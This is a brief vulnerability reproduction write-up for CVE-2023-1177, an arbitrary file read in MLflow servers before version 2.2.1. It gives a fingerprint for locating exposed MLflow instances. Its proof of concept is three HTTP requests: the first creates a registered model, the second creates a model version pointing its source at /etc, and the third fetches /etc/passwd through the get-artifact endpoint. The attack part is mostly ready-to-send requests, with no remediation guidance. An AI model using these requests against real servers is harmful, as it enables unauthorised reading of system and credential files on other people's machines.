# MLflow get-artifact arbitrary file reading vulnerability CVE-2023-1177

## Vulnerability Description

Users who host MLflow open source projects using the MLflow model registry mlflow server or mlflow ui use MLflow versions earlier than MLflow 2.2.1 without restricting who can query their servers (for example, by using cloud VPC, inbound requested IP whitelist, or authentication/authorization middleware).

This issue only affects running the mlflow server and mlflow ui commands. 

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">MLflow < 2.2.1</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">app.name="MLflow"</span>

## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1680785392550-723bb58a-8fb1-49ca-afd7-9faa9841b7ca.png)

Verify POC

```plain
POST /ajax-api/2.0/mlflow/registered-models/create
Content-Type: application/json

{"name": "testfile"}
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1680785555309-bc13e99b-784d-46aa-9b93-b3ca28ff457e.png)

```plain
POST /ajax-api/2.0/mlflow/model-versions/create
Content-Type: application/json

{"name": "testfile", "source": "/etc"}
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1680785596505-b26cf5f7-10c6-4202-83f7-d5ccd71a797f.png)

```plain
/model-versions/get-artifact?path=passwd&name=testfile&version=1
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1680785731521-49f79166-61c1-4e98-9cef-461227256df9.png)